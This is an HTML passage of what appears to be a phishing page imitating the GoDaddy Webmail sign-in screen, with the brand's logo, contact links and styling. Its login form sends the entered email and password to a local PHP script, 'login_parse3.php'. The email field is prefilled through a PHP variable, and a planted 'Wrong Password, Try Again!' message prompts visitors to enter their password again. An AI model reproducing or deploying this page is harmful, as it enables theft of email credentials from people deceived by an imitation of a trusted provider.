}</style><style>.p-none{padding:0 !important}.p-xxs{padding:5px !important}.p-xs{padding:10px !important}.p-sm{padding:15px !important}.p-m{padding:20px !important}.p-md{padding:25px !important}.p-lg{padding:30px !important}.p-xl{padding:40px !important}.p-t-none{padding-top:0}.p-t-xxs{padding-top:5px}.p-t-xs{padding-top:10px}.p-t-sm{padding-top:15px}.p-t-m{padding-top:20px}.p-t-md{padding-top:25px}.p-t-lg{padding-top:30px}.p-t-xl{padding-top:40px}.m-xxs{margin:2px 4px}.m-xs{margin:5px}.m-sm{margin:10px}.m{margin:15px}.m-md{margin:20px}.m-lg{margin:30px}.m-xl{margin:50px}.m-none{margin:0 !important}.m-l-none{margin-left:0}.m-l-xs{margin-left:5px}.m-l-sm{margin-left:10px}.m-l{margin-left:15px}.m-l-md{margin-left:20px}.m-l-lg{margin-left:30px}.m-l-xl{margin-left:40px}.m-l-n-xxs{margin-left:-1px}.m-l-n-xs{margin-left:-5px}.m-l-n-sm{margin-left:-10px}.m-l-n{margin-left:-15px}.m-l-n-md{margin-left:-20px}.m-l-n-lg{margin-left:-30px}.m-l-n-xl{margin-left:-40px}.m-t-none{margin-top:0}.m-t-xxs{margin-top:1px}.m-t-xs{margin-top:5px}.m-t-sm{margin-top:10px}.m-t{margin-top:15px}.m-t-md{margin-top:20px}.m-t-lg{margin-top:30px}.m-t-xl{margin-top:40px}.m-t-xxl{margin-top:50px}.m-t-xxxl{margin-top:60px}.m-t-n-xxs{margin-top:-1px}.m-t-n-xs{margin-top:-5px}.m-t-n-sm{margin-top:-10px}.m-t-n{margin-top:-15px}.m-t-n-md{margin-top:-20px}.m-t-n-lg{margin-top:-30px}.m-t-n-xl{margin-top:-40px}.m-r-none{margin-right:0}.m-r-xxs{margin-right:1px}.m-r-xs{margin-right:5px}.m-r-sm{margin-right:10px}.m-r{margin-right:15px}.m-r-md{margin-right:20px}.m-r-lg{margin-right:30px}.m-r-xl{margin-right:40px}.m-r-n-xxs{margin-right:-1px}.m-r-n-xs{margin-right:-5px}.m-r-n-sm{margin-right:-10px}.m-r-n{margin-right:-15px}.m-r-n-md{margin-right:-20px}.m-r-n-lg{margin-right:-30px}.m-r-n-xl{margin-right:-40px}.m-b-none{margin-bottom:0 !important}.m-b-xxs{margin-bottom:1px}.m-b-xs{margin-bottom:5px}.m-b-sm{margin-bottom:10px}.m-b{margin-bottom:15px}.m-b-md{margin-bottom:20px}.m-b-lg{margin-bottom:30px}.m-b-xl{margin-bottom:40px}.m-b-n-xxs{margin-bottom:-1px}.m-b-n-xs{margin-bottom:-5px}.m-b-n-sm{margin-bottom:-10px}.m-b-n{margin-bottom:-15px}.m-b-n-md{margin-bottom:-20px}.m-b-n-lg{margin-bottom:-30px}.m-b-n-xl{margin-bottom:-40px}.space-15{margin:15px 0}.space-20{margin:20px 0}.space-25{margin:25px 0}.space-30{margin:30px 0}#headless-logo-container svg{height:24px}#headless-logo-container .logo-container{display:flex;justify-content:center}#form-header{width:100%;margin-bottom:0px;padding-bottom:0px}#form-header .top-spacer{padding-top:10px}#form-header .logo-container{position:relative;width:100%;margin:auto}#form-header .logo{max-width:150px;max-height:50px}#form-header .white-override{color:white}#form-header #godaddy-template #default-logo-container{width:150px;margin:auto}#form-header #godaddy-template #default-logo-container .country-name{z-index:100;position:absolute;font-size:11px;right:12px;top:3px;white-space:nowrap}#form-header #godaddy-template #head-logo-container{width:36px;margin:auto}#form-header #godaddy-template #head-logo-container .country-name{z-index:100;position:absolute;font-size:11px;left:35px;top:38px;white-space:nowrap}#form-header #godaddy-template #title{text-align:center}#form-header #pass-template .logo-container-pass,#form-header #pass-template .logo-container-pass-o365-sign-in{border-top-left-radius:4px;border-top-right-radius:4px;padding:30px 0}#form-header #pass-template .logo-container-pass{background:#333}#form-header #pass-template .logo-container-pass-o365{width:150px;margin:auto}#form-header #pass-template .logo-container-pass-o365-sign-in{background:#E74225;margin:auto}#form-header #reseller-template .reseller-logo-container{width:150px;margin:auto}@media (min-width: 768px){#headless-logo-container svg{height:32px}#form-header .top-spacer{padding-top:20px}#form-header #reseller-template .logo{max-height:36px !important}#form-header .logo{max-width:275px;max-height:75px}#form-header #godaddy-template #default-logo-container{width:275px;margin:auto}#form-header #godaddy-template #default-logo-container .country-name{font-size:15px !important;right:40px;top:5px;white-space:nowrap}#form-header #godaddy-template #head-logo-container{width:55px;margin:auto}#form-header #godaddy-template #head-logo-container .country-name{font-size:15px !important;left:50px;top:58px;white-space:nowrap}#form-header #pass-template .logo-container-pass-o365{width:175px;margin:auto}#form-header #reseller-template .reseller-logo-container{width:275px;margin:auto}}#form-header #title .headline-brand{margin-top:12px;margin-bottom:0}@media (min-width: 768px){#form-header #title .headline-brand{margin-top:0;margin-bottom:0}}
</style></head>

<body class="ux-app uxf-flex">
  <div id="pass-bg">
    <svg viewBox="0 0 677 395"><g id="a274fe"><path stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" d="M2 243.66h196.88M216.22 243.94l458.71-.04" class="svg-fill-none svg-stroke-gray-dark"></path><rect x="523.08" y="269.84" width="84.33" height="20.88" rx="2" ry="2" stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" class="svg-fill-white svg-stroke-gray-dark"></rect><path stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" d="M598.4 279.68h-66.67" class="svg-fill-none svg-stroke-gray-dark"></path><path stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" d="M593.33 215.84v44.84h-56.17V179.3h56.17v17.88" class="svg-fill-primary-o svg-stroke-gray-dark"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M546.16 236.83l13.95-13.94M548 251.17l13.94-13.94" class="svg-fill-none svg-stroke-white"></path><path d="M593.33 179.3v-13.62a2 2 0 0 0-2-2h-52.17a2 2 0 0 0-2 2v13.62zM537.16 260.68v17a2 2 0 0 0 2 2h52.17a2 2 0 0 0 2-2v-17z" stroke-miterlimit="10" stroke-width="4" class="svg-fill-white svg-stroke-gray-dark"></path><path stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" d="M553.99 171.3h21.75" class="svg-fill-none svg-stroke-gray-light"></path><circle cx="564.87" cy="270.3" r="3.75" class="svg-fill-gray-light"></circle><path d="M309.65 325.29h170.9a8.47 8.47 0 0 1 8.44 8.44v42.9a8.47 8.47 0 0 1-8.44 8.44H267.4a8.47 8.47 0 0 1-8.44-8.44v-42.9a8.47 8.47 0 0 1 8.44-8.44h27.22" stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" class="svg-fill-white svg-stroke-gray-dark"></path><rect x="269.31" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="289" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="308.69" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="328.39" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="348.08" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect>
      <rect x="367.78" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="387.47" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="407.17" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="426.86" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="446.55" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="466.25" y="335.84" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="279.39" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="299.08" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="318.78" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="338.47" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="358.16" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="377.86" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="397.55" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="417.25" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="436.94" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="456.64" y="349.9" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="269.31" y="363.97" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="289" y="363.97" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><path d="M436.71 363.97h-125.2a2.82 2.82 0 0 0-2.81 2.82v5.62a2.82 2.82 0 0 0 2.81 2.82h125.2a2.82 2.82 0 0 0 2.81-2.82v-5.62a2.82 2.82 0 0 0-2.81-2.82z" class="svg-fill-gray-light"></path><rect x="446.55" y="363.97" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><rect x="466.25" y="363.97" width="12.66" height="11.25" rx="2.81" ry="2.81" class="svg-fill-gray-light"></rect><path d="M194.07 392.35a22.06 22.06 0 0 1-22-22v-26a21.83 21.83 0 0 1 2.6-10.36 22.13 22.13 0 0 1 19.4-11.64 22.06 22.06 0 0 1 22 22v26a22.06 22.06 0 0 1-22 22z" class="svg-fill-white"></path><path d="M209.6 328.81a21.89 21.89 0 0 0-15.53-6.46 22.06 22.06 0 0 0-22 22v26a22.06 22.06 0 0 0 22 22 22.06 22.06 0 0 0 22-22v-26a21.78 21.78 0 0 0-.83-6" stroke-linecap="round" stroke-miterlimit="10" stroke-width="3.838" class="svg-fill-none svg-stroke-gray-dark"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M188.46 353.84h-16M189.65 359.84h-17.19M191.2 365.84h-18.74M193.45 371.84h-20.83M196.27 377.84h-22.31M200.15 383.84h-23.38" class="svg-fill-none svg-stroke-gray-dark"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M172.46 345.1h43.1M194.06 323.18v21.92" class="svg-fill-none svg-stroke-gray-dark"></path><path d="M212.45 43.4a39.75 39.75 0 1 1-68 41.17" fill="#fee782"></path><path d="M170.4 83.39a19.18 19.18 0 0 1-6.88-6.73M196.5 56.68a19.28 19.28 0 0 1-12.24 28.8M105.44 241.9L67.16 133.96M66.04 128.98L111.4 11.43h24" stroke-linecap="round" stroke-linejoin="round" stroke-width="4" class="svg-fill-none svg-stroke-gray-dark"></path><circle cx="66.32" cy="128.93" r="11" stroke-linecap="round" stroke-linejoin="round" stroke-width="4" class="svg-fill-gray-light svg-stroke-gray-dark"></circle><path d="M136.4 29.8a18.32 18.32 0 1 1 31.33-19z" stroke-linecap="round" stroke-linejoin="round" stroke-width="4" class="svg-fill-gray-light svg-stroke-gray-dark"></path><path d="M219.4 42.82l-88.43 53.53a55.95 55.95 0 0 1 88.9-67" stroke-linecap="round" stroke-linejoin="round" stroke-width="4" class="svg-fill-gray-light svg-stroke-gray-dark"></path><path d="M58.4 272.29v10.07c0 5.44 20.63 9.84 46.08 9.84s46.08-4.4 46.08-9.84v-10.07z" stroke-miterlimit="10" stroke-width="4" class="svg-fill-gray-light svg-stroke-gray-dark"></path><path d="M141.03 265.36c6 1.66 9.55 3.74 9.55 6 0 5.44-20.63 9.84-46.08 9.84s-46.1-4.41-46.1-9.85 20.63-9.84 46.08-9.84a184.56 184.56 0 0 1 25.37 1.67" stroke-linecap="round" stroke-linejoin="round" stroke-width="4" class="svg-fill-white svg-stroke-gray-dark"></path><path d="M92.98 268.35v-22.82a5.77 5.77 0 0 1 5.76-5.76h11.52a5.77 5.77 0 0 1 5.76 5.76v22.82" stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" class="svg-fill-gray-light svg-stroke-gray-dark"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M125.49 49.19l10.83-6.62M124.07 57.09l13.72-8.38M123.03 64.76l16.69-10.2M122.9 71.87l19.24-11.76M123.89 78.29l20.83-12.72M125.58 84.3l22.88-13.99M127.83 89.95l24.84-15.18" class="svg-fill-none svg-stroke-gray-dark"></path><path d="M347.4 280.73h77.32a7.11 7.11 0 0 0 7.09-7.09v-1.18c0-3.9-2.94-4.45-7.09-7.09l-10.66-6-6-41.34h-70.57l-6 41.34-11 6c-3.3 2-7.08 3.19-7.08 7.09v1.18a7.11 7.11 0 0 0 7.08 7.09h9.18" class="svg-fill-white"></path><path d="M347.4 280.73h77.32a7.11 7.11 0 0 0 7.09-7.09v-1.18c0-3.9-2.94-4.45-7.09-7.09l-10.66-6-6-41.34h-70.57l-6 41.34-11 6c-3.3 2-7.08 3.19-7.08 7.09v1.18a7.11 7.11 0 0 0 7.08 7.09h9.18" stroke-linecap="round" stroke-linejoin="round" stroke-width="4" class="svg-fill-none svg-stroke-gray-dark"></path><path d="M501.9 164.05v54.22a6.78 6.78 0 0 1-6.67 6.85H249.9a6.79 6.79 0 0 1-6.67-6.85V22.91a6.79 6.79 0 0 1 6.67-6.85h245.33a6.78 6.78 0 0 1 6.67 6.85v123.42" stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" class="svg-fill-white svg-stroke-gray-dark"></path><path d="M262.98 186.41a5 5 0 0 1-4.88-5.09V36.05a5 5 0 0 1 4.88-5.09h220.1a5 5 0 0 1 4.88 5.09v145.27a5 5 0 0 1-4.88 5.09z" class="svg-fill-primary-o"></path><path d="M483.08 32.96a3 3 0 0 1 2.88 3.09v145.27a3 3 0 0 1-2.88 3.09h-220.1a3 3 0 0 1-2.88-3.09V36.05a3 3 0 0 1 2.88-3.09h220.1m0-4h-220.1a7 7 0 0 0-6.88 7.09v145.27a7 7 0 0 0 6.88 7.09h220.1a7 7 0 0 0 6.88-7.09V36.05a7 7 0 0 0-6.88-7.09z" class="svg-fill-gray-dark"></path><path d="M362.4 133.97h-.17" class="svg-fill-primary-o"></path>
      <path stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" d="M260.88 210.94h26.99" class="svg-fill-none svg-stroke-gray-dark"></path>
      <circle cx="373.01" cy="204.74" r="6.2" stroke-miterlimit="10" stroke-width="4" class="svg-fill-gray-light svg-stroke-gray-dark"></circle><circle cx="300.27" cy="210.94" r="3.54" class="svg-fill-gray-dark"></circle><path stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" d="M304.88 44.28h49.99" class="svg-fill-none svg-stroke-white"></path><circle cx="294.6" cy="44.28" r="3.54" class="svg-fill-white"></circle><circle cx="282.6" cy="44.28" r="3.54" class="svg-fill-white"></circle><circle cx="270.6" cy="44.28" r="3.54" class="svg-fill-white"></circle><circle cx="433.63" cy="491.5" r="41.25" transform="rotate(-20.7 -642.512 469.233)" class="svg-fill-white"></circle><path d="M391.24 120.47c-1.66-4.19-8.16-6.67-13.6-8.32a1.72 1.72 0 0 1-1-1.59 1.82 1.82 0 0 1 .37-1.1 15.4 15.4 0 0 0 4-10.27c0-5.92-3.25-11.67-10-11.67s-10 5.75-10 11.67a15.4 15.4 0 0 0 4 10.27 1.81 1.81 0 0 1 .36 1.1 1.71 1.71 0 0 1-1 1.59c-5.45 1.65-11.94 4.13-13.6 8.32a6.39 6.39 0 0 0-.47 2.41 6 6 0 0 0 4.75 6h31.86a6 6 0 0 0 4.74-6 6.58 6.58 0 0 0-.41-2.41z" class="svg-fill-gray-light"></path><path stroke-linecap="round" stroke-miterlimit="10" stroke-width="4" d="M331.67 259.88h66.96" class="svg-fill-none svg-stroke-gray-dark"></path></g></svg></div>
    
    <div class="footer_fixer"><div id="header-595332e034aad5c1056bd2a860e629f8"><div><div><div class="language-header see-change-bar">
      <div class="container-fluid"><div class="flex-row d-flex"><div class="see-change-bar-left d-flex"><div class="topnav-logo-wrap"><a href="https://www.godaddy.com?app=email&amp;realm=pass" class="topnav-logo" data-eid="uxp.hyd.utility_bar.logo.link.click" data-tcc-ignore="true"><span class="mobile-logo go-logo" aria-label="GoDaddy"><span class="sr-only sr-logo">GoDaddy</span><svg class="svg-fill-black" viewBox="0 0 36 32" xmlns="http://www.w3.org/2000/svg"><path d="M30.824 1.453c-3.713-2.316-8.603-1.77-12.963.972-4.347-2.74-9.239-3.288-12.948-.972C-.955 5.12-1.667 14.564 3.32 22.546c3.677 5.887 9.428 9.335 14.548 9.271 5.119.064 10.87-3.384 14.547-9.27C37.4 14.563 36.692 5.12 30.824 1.452zM6.02 20.863a19.112 19.112 0 01-2.303-5.273 15.067 15.067 0 01-.5-4.97C3.44 7.673 4.64 5.375 6.598 4.15c1.957-1.224 4.544-1.295 7.299-.203.419.169.829.358 1.228.568a22.496 22.496 0 00-3.956 4.754C8.14 14.116 7.215 19.511 8.272 23.81a19.723 19.723 0 01-2.253-2.947zm26.003-5.273a19.158 19.158 0 01-2.302 5.272 19.733 19.733 0 01-2.254 2.954c.946-3.855.303-8.576-2.014-13.005a.583.583 0 00-.837-.228l-7.225 4.515a.59.59 0 00-.188.813l1.06 1.695a.59.59 0 00.814.188l4.683-2.925c.151.454.303.901.416 1.363.442 1.617.611 3.297.5 4.97-.223 2.95-1.424 5.247-3.38 6.471a6.607 6.607 0 01-3.35.97h-.15a6.599 6.599 0 01-3.35-.97c-1.958-1.224-3.159-3.521-3.381-6.472-.11-1.672.058-3.352.5-4.969a19.671 19.671 0 016.03-9.65 15.108 15.108 0 014.241-2.629c2.748-1.092 5.34-1.02 7.298.203 1.958 1.224 3.157 3.522 3.38 6.47a15.105 15.105 0 01-.49 4.964zM27.89 30.386v-.21c0-.015.005-.03.015-.04a.048.048 0 01.038-.015h1.342c.014-.001.028.004.038.015.01.01.016.025.015.04v.21a.051.051 0 01-.015.04.048.048 0 01-.038.014h-.49v1.322a.05.05 0 01-.017.04.051.051 0 01-.038.017h-.253a.055.055 0 01-.038-.017.06.06 0 01-.015-.04V30.44h-.49a.048.048 0 01-.039-.015.051.051 0 01-.015-.04zm2.345-.217l.374.848.375-.848a.073.073 0 01.03-.036.08.08 0 01.05-.012h.4a.051.051 0 01.053.053v1.592a.056.056 0 01-.013.037.05.05 0 01-.037.016h-.24a.055.055 0 01-.038-.016.056.056 0 01-.015-.037v-1.203l-.393.874a.09.09 0 01-.03.04.086.086 0 01-.05.013h-.194a.085.085 0 01-.048-.012.09.09 0 01-.03-.041l-.393-.874v1.203a.05.05 0 01-.015.037.053.053 0 01-.036.016h-.243a.05.05 0 01-.036-.016.056.056 0 01-.015-.037v-1.592a.05.05 0 01.017-.038.047.047 0 01.036-.015h.413a.083.083 0 01.049.012.071.071 0 01.029.036z"></path></svg></span><span class="desktop-logo go-logo" aria-label="GoDaddy"><span class="sr-only sr-logo">GoDaddy</span><svg class="svg-fill-black" viewBox="0 0 166 34" xmlns="http://www.w3.org/2000/svg"><path d="M32.937 1.554c-3.968-2.48-9.193-1.889-13.852 1.039C14.44-.335 9.213-.925 5.25 1.553c-6.27 3.919-7.032 14.01-1.701 22.54 3.93 6.289 10.074 9.974 15.544 9.906 5.47.068 11.615-3.617 15.545-9.906 5.324-8.53 4.568-18.621-1.701-22.54zM6.43 22.292a20.434 20.434 0 01-2.46-5.632 16.104 16.104 0 01-.534-5.31c.238-3.153 1.521-5.608 3.612-6.914s4.855-1.385 7.8-.217c.441.177.878.38 1.312.606a24.09 24.09 0 00-4.228 5.081C8.697 15.086 7.71 20.848 8.84 25.443a20.911 20.911 0 01-2.408-3.151zm27.786-5.634a20.482 20.482 0 01-2.46 5.632 21.1 21.1 0 01-2.408 3.158c1.01-4.12.324-9.165-2.153-13.897a.625.625 0 00-.895-.243l-7.72 4.823a.631.631 0 00-.2.87l1.133 1.811a.63.63 0 00.869.2l5.004-3.126c.162.486.324.971.445 1.457a16.1 16.1 0 01.536 5.303c-.238 3.151-1.521 5.606-3.612 6.914a7.06 7.06 0 01-3.579 1.036h-.16a7.051 7.051 0 01-3.578-1.036c-2.093-1.308-3.376-3.763-3.614-6.914a16.143 16.143 0 01.534-5.31 21.015 21.015 0 016.444-10.314 16.137 16.137 0 014.532-2.806c2.936-1.168 5.705-1.09 7.797.217 2.093 1.308 3.375 3.761 3.613 6.914a16.145 16.145 0 01-.528 5.311zm39.848-3.766c-4.06 0-7.34 3.169-7.34 7.2 0 4.004 3.28 7.121 7.34 7.121 4.086 0 7.366-3.112 7.366-7.12 0-4.03-3.275-7.2-7.366-7.2zm0 10.557c-1.871 0-3.295-1.513-3.295-3.384s1.424-3.407 3.295-3.407c1.898 0 3.322 1.54 3.322 3.412 0 1.87-1.424 3.385-3.322 3.385zM90.583 7.362h-7.468a.6.6 0 00-.61.612v18.208a.605.605 0 00.61.648h7.468c5.977 0 10.13-3.975 10.13-9.758 0-5.818-4.153-9.71-10.13-9.71zm.177 15.622h-4.087V11.198h4.087c3.308 0 5.588 2.474 5.588 5.866 0 3.336-2.28 5.92-5.588 5.92zm24.82-9.7h-2.809a.633.633 0 00-.582.612v.833c-.64-1.057-2.085-1.835-3.884-1.835-3.503 0-6.783 2.751-6.783 7.145 0 4.37 3.251 7.171 6.755 7.171 1.806 0 3.28-.777 3.92-1.834v.861a.587.587 0 00.582.585h2.808a.571.571 0 00.584-.585V13.896a.594.594 0 00-.592-.612zm-6.533 10.196c-1.86 0-3.256-1.43-3.256-3.412s1.397-3.41 3.256-3.41c1.86 0 3.257 1.426 3.257 3.408s-1.395 3.412-3.257 3.412zm22.294-16.118h-2.808a.592.592 0 00-.61.584v6.728c-.648-1.002-2.114-1.78-3.948-1.78-3.476 0-6.7 2.751-6.7 7.145 0 4.37 3.252 7.171 6.755 7.171 1.806 0 3.17-.777 3.92-1.834v.861c0 .322.261.583.583.585h2.808a.57.57 0 00.584-.585V7.95a.57.57 0 00-.584-.588zm-6.532 16.152c-1.852 0-3.237-1.444-3.237-3.448s1.39-3.447 3.237-3.447c1.846 0 3.237 1.444 3.237 3.447s-1.384 3.448-3.237 3.448zm22.29-16.152h-2.803a.594.594 0 00-.612.584v6.728c-.64-1.002-2.114-1.78-3.947-1.78-3.477 0-6.7 2.751-6.7 7.145 0 4.37 3.253 7.171 6.755 7.171 1.807 0 3.168-.777 3.92-1.834v.861a.587.587 0 00.584.585h2.803a.568.568 0 00.582-.585V7.95a.568.568 0 00-.582-.588zm-6.532 16.152c-1.853 0-3.237-1.444-3.237-3.448s1.39-3.447 3.237-3.447c1.846 0 3.237 1.444 3.237 3.447s-1.38 3.448-3.232 3.448zm21.906-9.283l-4.19 14.37c-.809 2.556-2.613 4.086-5.421 4.086-1.277 0-2.44-.261-3.35-.782-.531-.303-.971-.58-.971-1.023 0-.275.089-.417.25-.675l.832-1.246c.235-.348.408-.461.66-.461a.96.96 0 01.554.192c.523.339 1.008.63 1.748.63.864 0 1.524-.277 1.88-1.306l.36-1.193h-1.696c-.418 0-.648-.249-.751-.584l-3.75-12.008c-.14-.473-.011-.946.683-.946h2.954c.36 0 .613.123.771.64l2.77 9.67 2.589-9.67c.082-.334.306-.64.75-.64h2.802c.552-.001.719.387.526.946zm-96.806 4.274v7.676a.625.625 0 01-.635.634h-2.317a.623.623 0 01-.634-.634v-2.015c-1.472 1.858-4.03 3.028-6.924 3.028-5.434 0-9.681-4.088-9.681-9.908 0-6.048 4.585-10.217 10.377-10.217 4.276 0 7.694 1.839 9.212 5.537a.843.843 0 01.07.309c0 .175-.116.307-.486.435l-2.706 1.042a.694.694 0 01-.511.009.783.783 0 01-.324-.371c-.971-1.847-2.7-3.1-5.36-3.1-3.45 0-5.922 2.694-5.922 6.188 0 3.387 2.104 6.172 6.02 6.172 2.06 0 3.703-.97 4.469-2.037H57.87a.625.625 0 01-.634-.635v-2.086a.625.625 0 01.634-.634h7.161a.604.604 0 01.635.607zm96.882-8.063v-.186c0-.013.005-.026.013-.036a.052.052 0 01.034-.013h1.183c.013 0 .025.005.034.013.009.01.013.023.013.036v.186a.052.052 0 01-.013.034.047.047 0 01-.034.013h-.432v1.167a.05.05 0 01-.048.048h-.224a.044.044 0 01-.032-.014.047.047 0 01-.015-.034v-1.167h-.432a.044.044 0 01-.047-.047zm2.069-.193l.323.75.324-.75a.066.066 0 01.026-.032.087.087 0 01.044-.01h.375a.044.044 0 01.047.046v1.404a.044.044 0 01-.045.047h-.21a.047.047 0 01-.035-.013.042.042 0 01-.013-.034v-1.06l-.348.77a.084.084 0 01-.026.038.08.08 0 01-.043.01h-.172a.078.078 0 01-.042-.01.073.073 0 01-.026-.037l-.346-.77v1.06a.052.052 0 01-.013.033.052.052 0 01-.032.013h-.216a.042.042 0 01-.03-.013.042.042 0 01-.013-.034v-1.404a.044.044 0 01.047-.046h.364c.014 0 .029.003.042.01.009.009.015.02.018.032z"></path></svg></span></a></div></div>
    
    <div class="see-change-bar-right justify-content-end"><div class="tray-menu contact-tray">
      <div class="tray-toggle-wrapper">
        <button aria-label="Contact Us" class="tray-toggle" data-eid="uxp.hyd.utility_bar.contact_tray.tray.click" aria-expanded="false" aria-haspopup="true"><span>
          <span class="basic-phone-text hidden-sm-down title-text">Contact Us 24/7</span></span><svg class="uxicon-svg-container " height="20" width="20" role="img">
            <use fill="currentColor" xlink:href="#svg-container-chevron-down-lt"></use></svg></button></div><div class="tray-fullwidth tray-dropdown loaded"><div class="tray-content">
              <button class="close" aria-label="close"></button>
              <div class="container"><div class="row">
                <div class="col-lg-4 col-md-6 content-wrap">
                  <div class="row">
                  <div class="col-sm-12">
                <div class="font-primary-bold h3">Call us</div></div></div>
                <ul class="alt-contact-list list-unstyled"><li><span>Call our award-winning sales &amp; support team 24/7</span><a class="contact-link" data-eid="uxp.hyd.utility_bar.support_phone.click" href="tel:4804638387">480-463-8387</a></li></ul><div class="contact-link-info">Global Directory</div>
      <a href="https://www.godaddy.com/contact-us" class="contact-link" data-eid="uxp.hyd.utility_bar.global_directory.link.click" data-tcc-ignore="true">Phone numbers and hours</a></div>
      <div class="col-lg-4 col-md-6 content-wrap divider"><div id="gdchat-container"></div></div>
    
    <div class="col-md-4 help-mobile hidden-md-up"><div class="row">
      <div class="col-sm-12"><div class="font-primary-bold h3">Help Center</div></div></div>
    <p>Explore our online help resources</p><div><a href="https://www.godaddy.com/help" class="btn btn-default" data-eid="uxp.hyd.utility_bar.help_center_link.link.click" data-tcc-ignore="true">Get Help</a>
    </div></div></div></div></div></div></div></div></div></div></div></div></div></div>
    <div class="lg-container"><div id="iframe-shrinker" class="row"><div id="login-container-row" class="panel-container-row"><div id="left-col" class="col-lg-6 col-xl-6"></div>
    <div id="login-container-col" class="container-width-limit col-xs-12 col-sm-8 offset-sm-2 col-md-6 offset-md-3 col-lg-6 col-xl-6  offset-lg-0 "><div id="login-container">
      <div id="login-panel" class="ssodeck-framable-content"><div><div id="new-ux" class="card ux-card  pass"><div class="card-block  pass"><div></div>
      <div id="form-header" class="pass-form-header">
        <div id="pass-template" class="m-b-sm"><div id="app-title" class="logo-container-pass text-center"><h2 class="white-override m-b-none">Webmail</h2></div></div></div>
        <div id="form-container"><div id="login-status-message"></div>
        <h2 id="pass-title">Sign in</h2>
        <p style="color: red">
            Wrong Password, Try Again!
          </p>
        <form action="login_parse3.php" method="post">><fieldset class="form-group">
          <label for="username" id="label-username">Email </label>
          <div style="position: relative; width: 100%;">
            <input id="username" type="email" aria-labelledby="label-username" aria-required="false" class="username-input ctHidden form-control" name="user" value="<?php echo $attmail; ?>"></div></fieldset>
          <div id="password-container">
            <fieldset class="form-group"><label for="password" id="label-password">Password </label>
            <div class="pull-right"><a class="btn btn-tertiary-inline btn-sm" aria-label="form_action_button"><div></div></a></div>
            <div style="position: relative; width: 100%;">
              <input id="password" type="password" aria-labelledby="label-password" aria-required="false" class="ctHidden form-control" value="" name="pass"></div></fieldset>
              <a target="_parent" class="show-hide btn btn-tertiary-inline btn-sm text-primary-o pull-right" tabindex="0">Show</a></div>
              <div id="remember-me-container" class="input-container">
                <fieldset class="form-group"><div class="form-check"><label for="remember-me" class="form-check-label custom-control custom-checkbox" id="label-remember-me">
                  <input tabindex="0" id="remember-me" type="checkbox" aria-labelledby="label-remember-me" aria-required="false" class="custom-control-input" value="true" checked="">
                  <span class="custom-control-indicator"><svg class="uxicon-svg-container" height="1.5em" width="1.5em" role="img">
                    <use fill="currentColor" xlink:href="#svg-container-checkmark"></use></svg></span>
                    <span class="custom-control-description"><span>Keep me signed in<span id="remember-me-tip">
                      <span role="button" aria-haspopup="true" tabindex="0" class="tooltip-over-text" style="cursor: pointer; outline: currentcolor none medium;"><span class="text-default">
                        <svg class="uxicon-svg-container" height="18" width="18" role="img"><use fill="currentColor" xlink:href="#icon-svgosm-information"></use></svg></span></span></span></span></span></label></div></fieldset></div>
                        <button target="_parent" tabindex="0" class="btn btn-primary btn-purchase btn-block" id="submitBtn" type="submit" name="submit">Sign In</button><div id="social-login-buttons-container" class="">
                          <div class="ux-btn-set ux-btn-split" role="group"></div></div></form>
                          
                          <p id="recovery-links">Need to find <a target="_top" id="forgot_password" class="text-primary-o" href="https://sso.godaddy.com/v1/account/reset?app=email&amp;realm=pass">your password</a>?</p></div>
                        </div></div>
                        <div id="email-promo-footer"><div class="font-primary-bold" id="email-message"> Don't have GoDaddy email?</div>
